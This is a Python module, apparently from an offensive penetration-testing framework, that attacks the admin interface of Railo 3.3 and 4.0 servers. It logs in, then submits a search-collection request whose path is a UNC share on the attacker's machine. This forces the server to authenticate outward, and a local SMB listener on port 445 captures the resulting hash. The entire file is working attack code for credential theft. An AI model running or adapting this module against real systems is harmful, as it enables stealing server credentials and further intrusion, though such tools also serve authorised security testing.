from src.platform.railo.authenticate import checkAuth
from src.platform.railo.interfaces import RINTERFACES
from src.lib.cifstrap import Handler
from auxiliary import Auxiliary
from threading import Thread
from time import sleep
from log import LOG
import socket
import utility
import state


class Auxiliary:

    def __init__(self):
        self.name = 'Obtain SMB hash'
        self.versions = ['3.3', '4.0']
        self.flag = 'rl-smb'
        self._Listen = False

    def check(self, fingerprint):
        if fingerprint.version in self.versions and fingerprint.title \
                in [RINTERFACES.WEB]:
            return True

        return False

    def run(self, fingerengine, fingerprint):
        """ Create a search collection via a nonexistent
        datasource
        """

        if not utility.check_admin():
            utility.Msg("Root privs required for this module.", LOG.ERROR)
            return

        utility.Msg("Setting up SMB listener...")

        self._Listen = True
        thread = Thread(target=self.smb_listener)
        thread.start()

        utility.Msg("Invoking UNC deployer...")

        base = 'http://{0}:{1}'.format(fingerengine.options.ip, fingerprint.port)
        uri = "/railo-context/admin/web.cfm?action=services.search"
        data = { "collName" : "asdf",
                 "collPath" : "\\\\{0}\\asdf".format(utility.local_address()),
                 "collLanguage" : "english",
                 "run" : "create"
               }

        url = base + uri
        cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                            fingerprint.title)
        if not cookies:
            utility.Msg("Could not get auth for %s:%s" % (fingerengine.options.ip,
                                                          fingerprint.port),
                                                          LOG.ERROR)
            self._Listen = False
            return

        response = utility.requests_post(url, data=data, cookies=cookies)

        while thread.is_alive():
            # spin...
            sleep(1)

        if response.status_code != 200:

            utility.Msg("Unexpected response: HTTP %d" % response.status_code)

        self._Listen = False

    def smb_listener(self):
        """ Accept a connection and pass it off for parsing to cifstrap
        """

        try:
            handler = None
            sock = socket.socket()
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(state.timeout)
            sock.bind(('', 445))
            sock.listen(1)

            while self._Listen:
                try:
                    (con, addr) = sock.accept()
                except:
                    # timeout
                    return

                handler = Handler(con, addr)
                handler.start()

                while handler.is_alive():
                    # spin...
                    sleep(1)

                if handler.data:
                    utility.Msg("%s" % handler.data, LOG.SUCCESS)

                break

        except Exception, e:
            utility.Msg("Socket error: %s" % e, LOG.ERROR)
        finally:
            sock.close()
